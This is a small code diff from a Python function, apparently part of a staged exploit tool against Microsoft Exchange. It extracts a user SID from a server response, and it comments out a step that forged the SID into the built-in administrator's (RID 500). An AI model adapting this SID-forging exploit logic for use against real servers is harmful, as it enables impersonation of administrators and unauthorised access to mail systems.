@@ -65,11 +65,11 @@ def GetSID(target, legacyDn):
 
     sid = stage2.content.decode('cp1252').strip().split("with SID ")[1].split(" and MasterAccountSid")[0]
 
-    if sid.split("-")[-1] != "500":
-        logger.warning("[Stage 2] User SID not an administrator, fixing user SID")
-        base_sid = sid.split("-")[:-1]
-        base_sid.append("500")
-        sid = "-".join(base_sid)
+    # if sid.split("-")[-1] != "500":
+    #     logger.warning("[Stage 2] User SID not an administrator, fixing user SID")
+    #     base_sid = sid.split("-")[:-1]
+    #     base_sid.append("500")
+    #     sid = "-".join(base_sid)
 
     logger.debug("[Stage 2] Successfully obtained SID: " + sid)
     return sid
